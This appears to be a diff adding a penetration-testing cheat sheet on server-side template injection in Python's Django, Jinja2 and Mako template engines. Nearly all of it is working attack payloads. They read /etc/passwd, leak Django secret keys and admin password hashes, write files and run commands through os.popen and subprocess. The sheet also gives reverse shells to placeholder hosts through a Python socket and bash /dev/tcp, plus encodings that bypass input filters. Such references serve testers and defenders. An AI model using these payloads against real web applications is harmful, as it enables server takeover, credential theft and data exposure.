@@ -1,0 +1,381 @@
+# Server Side Template Injection - Python
+
+## Summary
+
+- [Django](#django)
+- [Jinja2](#jinja2)
+    - [Jinja2 - Basic injection](#jinja2---basic-injection)
+    - [Jinja2 - Template format](#jinja2---template-format)
+    - [Jinja2 - Debug Statement](#jinja2---debug-statement)
+    - [Jinja2 - Dump all used classes](#jinja2---dump-all-used-classes)
+    - [Jinja2 - Dump all config variables](#jinja2---dump-all-config-variables)
+    - [Jinja2 - Read remote file](#jinja2---read-remote-file)
+    - [Jinja2 - Write into remote file](#jinja2---write-into-remote-file)
+    - [Jinja2 - Remote Code Execution](#jinja2---remote-code-execution)
+        - [Forcing output on blind RCE](#jinja2---forcing-output-on-blind-rce)
+        - [Exploit the SSTI by calling os.popen().read()](#exploit-the-ssti-by-calling-ospopenread)
+        - [Exploit the SSTI by calling subprocess.Popen](#exploit-the-ssti-by-calling-subprocesspopen)
+        - [Exploit the SSTI by calling Popen without guessing the offset](#exploit-the-ssti-by-calling-popen-without-guessing-the-offset)
+        - [Exploit the SSTI by writing an evil config file.](#exploit-the-ssti-by-writing-an-evil-config-file)
+    - [Jinja2 - Filter bypass](#jinja2---filter-bypass)
+- [Mako](#mako)
+    - [Direct access to os from TemplateNamespace:](#direct-access-to-os-from-templatenamespace)
+
+## Django
+
+Django template language supports 2 rendering engines by default: Django Templates (DT) and Jinja2. Django Templates is much simpler engine. It does not allow calling of passed object functions and impact of SSTI in DT is often less severe than in Jinja2.
+
+### Django - Detection
+
+```python
+{% csrf_token %} # Causes error with Jinja2
+{{ 7*7 }}  # Error with Django Templates
+ih0vr{{364|add:733}}d121r # Burp Payload -> ih0vr1097d121r
+```
+
+### Django Templates for post-exploitation
+
+```python
+# Variables
+{{ variable }}
+{{ variable.attr }}
+
+# Filters
+{{ value|length }}
+
+# Tags
+{% csrf_token %}
+```
+
+### Cross-site scripting
+
+```python
+{{ '<script>alert(3)</script>' }}
+{{ '<script>alert(3)</script>' | safe }}
+```
+
+### Debug information leak
+
+```python
+{% debug %}
+```
+
+### Leaking app’s Secret Key
+
+```python
+{{ messages.storages.0.signer.key }}
+```
+
+### Admin Site URL leak
+
+
+```
+{% include 'admin/base.html' %}
+```
+
+### Admin username and password hash leak
+
+
+```
+{% load log %}{% get_admin_log 10 as log %}{% for e in log %}
+{{e.user.get_username}} : {{e.user.password}}{% endfor %}
+```
+
+---
+
+## Jinja2
+
+[Official website](https://jinja.palletsprojects.com/)
+> Jinja2 is a full featured template engine for Python. It has full unicode support, an optional integrated sandboxed execution environment, widely used and BSD licensed.  
+
+### Jinja2 - Basic injection
+
+```python
+{{4*4}}[[5*5]]
+{{7*'7'}} would result in 7777777
+{{config.items()}}
+```
+
+Jinja2 is used by Python Web Frameworks such as Django or Flask.
+The above injections have been tested on a Flask application.
+
+### Jinja2 - Template format
+
+```python
+{% extends "layout.html" %}
+{% block body %}
+  <ul>
+  {% for user in users %}
+    <li><a href="{{ user.url }}">{{ user.username }}</a></li>
+  {% endfor %}
+  </ul>
+{% endblock %}
+
+```
+
+### Jinja2 - Debug Statement
+
+If the Debug Extension is enabled, a `{% debug %}` tag will be available to dump the current context as well as the available filters and tests. This is useful to see what’s available to use in the template without setting up a debugger.
+
+```python
+<pre>{% debug %}</pre>
+```
+
+Source: https://jinja.palletsprojects.com/en/2.11.x/templates/#debug-statement
+
+### Jinja2 - Dump all used classes
+
+```python
+{{ [].class.base.subclasses() }}
+{{''.class.mro()[1].subclasses()}}
+{{ ''.__class__.__mro__[2].__subclasses__() }}
+```
+
+Access `__globals__` and `__builtins__`:
+
+```python
+{{ self.__init__.__globals__.__builtins__ }}
+```
+
+### Jinja2 - Dump all config variables
+
+```python
+{% for key, value in config.iteritems() %}
+    <dt>{{ key|e }}</dt>
+    <dd>{{ value|e }}</dd>
+{% endfor %}
+```
+
+### Jinja2 - Read remote file
+
+```python
+# ''.__class__.__mro__[2].__subclasses__()[40] = File class
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
+{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/tmp/flag").read() }}
+# https://github.com/pallets/flask/blob/master/src/flask/helpers.py#L398
+{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
+```
+
+### Jinja2 - Write into remote file
+
+```python
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}
+```
+
+### Jinja2 - Remote Code Execution
+
+Listen for connection
+
+```bash
+nc -lnvp 8000
+```
+
+#### Jinja2 - Forcing output on blind RCE
+
+You can import Flask functions to return an output from the vulnerable page.
+
+```py
+{{
+x.__init__.__builtins__.exec("from flask import current_app, after_this_request
+@after_this_request
+def hook(*args, **kwargs):
+    from flask import make_response
+    r = make_response('Powned')
+    return r
+")
+}}
+```
+
+
+#### Exploit the SSTI by calling os.popen().read()
+
+```python
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
+```
+
+But when `__builtins__` is filtered, the following payloads are context-free, and do not require anything, except being in a jinja2 Template object:
+
+```python
+{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
+{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
+{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}
+```
+
+We can use these shorter payloads:
+
+```python
+{{ cycler.__init__.__globals__.os.popen('id').read() }}
+{{ joiner.__init__.__globals__.os.popen('id').read() }}
+{{ namespace.__init__.__globals__.os.popen('id').read() }}
+```
+
+Source [@podalirius_](https://twitter.com/podalirius_) : https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/
+
+With [objectwalker](https://github.com/p0dalirius/objectwalker) we can find a path to the `os` module from `lipsum`. This is the shortest payload known to achieve RCE in a Jinja2 template:
+
+```python
+{{ lipsum.__globals__["os"].popen('id').read() }}
+```
+
+Source: https://twitter.com/podalirius_/status/1655970628648697860
+
+#### Exploit the SSTI by calling subprocess.Popen
+
+:warning: the number 396 will vary depending of the application.
+
+```python
+{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
+{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
+```
+
+#### Exploit the SSTI by calling Popen without guessing the offset
+
+```python
+{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
+```
+
+Simply modification of payload to clean up output and facilitate command input (https://twitter.com/SecGus/status/1198976764351066113)
+In another GET parameter include a variable named "input" that contains the command you want to run (For example: &input=ls)
+
+```python
+{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
+```
+
+#### Exploit the SSTI by writing an evil config file.
+
+```python
+# evil config
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}
+
+# load the evil config
+{{ config.from_pyfile('/tmp/evilconfig.cfg') }}  
+
+# connect to evil host
+{{ config['RUNCMD']('/bin/bash -c "/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1"',shell=True) }}
+```
+
+### Jinja2 - Filter bypass
+
+```python
+request.__class__
+request["__class__"]
+```
+
+Bypassing `_`
+
+```python
+http://localhost:5000/?exploit={{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}&class=class&usc=_
+
+{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}
+{{request|attr(["_"*2,"class","_"*2]|join)}}
+{{request|attr(["__","class","__"]|join)}}
+{{request|attr("__class__")}}
+{{request.__class__}}
+```
+
+Bypassing `[` and `]`
+
+```python
+http://localhost:5000/?exploit={{request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)}}&class=class&usc=_
+or
+http://localhost:5000/?exploit={{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_
+```
+
+Bypassing `|join`
+
+```python
+http://localhost:5000/?exploit={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_
+```
+
+Bypassing most common filters ('.','_','|join','[',']','mro' and 'base') by https://twitter.com/SecGus:
+```python
+{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
+```
+
+---
+
+
+## Mako
+
+[Official website](https://www.makotemplates.org/)
+> Mako is a template library written in Python. Conceptually, Mako is an embedded Python (i.e. Python Server Page) language, which refines the familiar ideas of componentized layout and inheritance to produce one of the most straightforward and flexible models available, while also maintaining close ties to Python calling and scoping semantics.
+
+```python
+<%
+import os
+x=os.popen('id').read()
+%>
+${x}
+```
+
+### Direct access to os from TemplateNamespace:
+
+Any of these payloads allows direct access to the `os` module
+
+```python
+${self.module.cache.util.os.system("id")}
+${self.module.runtime.util.os.system("id")}
+${self.template.module.cache.util.os.system("id")}
+${self.module.cache.compat.inspect.os.system("id")}
+${self.__init__.__globals__['util'].os.system('id')}
+${self.template.module.runtime.util.os.system("id")}
+${self.module.filters.compat.inspect.os.system("id")}
+${self.module.runtime.compat.inspect.os.system("id")}
+${self.module.runtime.exceptions.util.os.system("id")}
+${self.template.__init__.__globals__['os'].system('id')}
+${self.module.cache.util.compat.inspect.os.system("id")}
+${self.module.runtime.util.compat.inspect.os.system("id")}
+${self.template._mmarker.module.cache.util.os.system("id")}
+${self.template.module.cache.compat.inspect.os.system("id")}
+${self.module.cache.compat.inspect.linecache.os.system("id")}
+${self.template._mmarker.module.runtime.util.os.system("id")}
+${self.attr._NSAttr__parent.module.cache.util.os.system("id")}
+${self.template.module.filters.compat.inspect.os.system("id")}
+${self.template.module.runtime.compat.inspect.os.system("id")}
+${self.module.filters.compat.inspect.linecache.os.system("id")}
+${self.module.runtime.compat.inspect.linecache.os.system("id")}
+${self.template.module.runtime.exceptions.util.os.system("id")}
+${self.attr._NSAttr__parent.module.runtime.util.os.system("id")}
+${self.context._with_template.module.cache.util.os.system("id")}
+${self.module.runtime.exceptions.compat.inspect.os.system("id")}
+${self.template.module.cache.util.compat.inspect.os.system("id")}
+${self.context._with_template.module.runtime.util.os.system("id")}
+${self.module.cache.util.compat.inspect.linecache.os.system("id")}
+${self.template.module.runtime.util.compat.inspect.os.system("id")}
+${self.module.runtime.util.compat.inspect.linecache.os.system("id")}
+${self.module.runtime.exceptions.traceback.linecache.os.system("id")}
+${self.module.runtime.exceptions.util.compat.inspect.os.system("id")}
+${self.template._mmarker.module.cache.compat.inspect.os.system("id")}
+${self.template.module.cache.compat.inspect.linecache.os.system("id")}
+${self.attr._NSAttr__parent.template.module.cache.util.os.system("id")}
+${self.template._mmarker.module.filters.compat.inspect.os.system("id")}
+${self.template._mmarker.module.runtime.compat.inspect.os.system("id")}
+${self.attr._NSAttr__parent.module.cache.compat.inspect.os.system("id")}
+${self.template._mmarker.module.runtime.exceptions.util.os.system("id")}
+${self.template.module.filters.compat.inspect.linecache.os.system("id")}
+${self.template.module.runtime.compat.inspect.linecache.os.system("id")}
+${self.attr._NSAttr__parent.template.module.runtime.util.os.system("id")}
+${self.context._with_template._mmarker.module.cache.util.os.system("id")}
+${self.template.module.runtime.exceptions.compat.inspect.os.system("id")}
+${self.attr._NSAttr__parent.module.filters.compat.inspect.os.system("id")}
+${self.attr._NSAttr__parent.module.runtime.compat.inspect.os.system("id")}
+${self.context._with_template.module.cache.compat.inspect.os.system("id")}
+${self.module.runtime.exceptions.compat.inspect.linecache.os.system("id")}
+${self.attr._NSAttr__parent.module.runtime.exceptions.util.os.system("id")}
+${self.context._with_template._mmarker.module.runtime.util.os.system("id")}
+${self.context._with_template.module.filters.compat.inspect.os.system("id")}
+${self.context._with_template.module.runtime.compat.inspect.os.system("id")}
+${self.context._with_template.module.runtime.exceptions.util.os.system("id")}
+${self.template.module.runtime.exceptions.traceback.linecache.os.system("id")}
+```
+
+PoC :
+
+```python
+>>> print(Template("${self.module.cache.util.os}").render())
+<module 'os' from '/usr/local/lib/python3.10/os.py'>
+```
+
+Source [@podalirius_](https://twitter.com/podalirius_) : [https://podalirius.net/en/articles/python-context-free-payloads-in-mako-templates/](https://podalirius.net/en/articles/python-context-free-payloads-in-mako-templates/)
+
+---
